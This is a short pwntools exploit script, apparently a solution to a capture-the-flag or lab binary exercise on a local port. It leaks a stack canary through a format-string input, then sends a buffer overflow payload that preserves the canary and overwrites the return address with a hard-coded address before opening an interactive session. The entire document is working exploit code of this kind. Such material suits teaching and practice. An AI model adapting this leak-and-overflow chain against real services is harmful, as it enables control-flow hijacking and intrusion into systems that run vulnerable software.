from pwn import *

host = "127.0.0.1"
port = 1111

p = remote(host, port)

log.info(p.clean())
p.sendline('%23$p')

canary = int(p.recvline(), 16)
log.success(f'Canary: {hex(canary)}')

payload = b'A' * 64
payload += p32(canary)
payload += b'A' * 12
payload += p32(0x080492cf)

p.clean()
p.sendline(payload)

p.interactive()
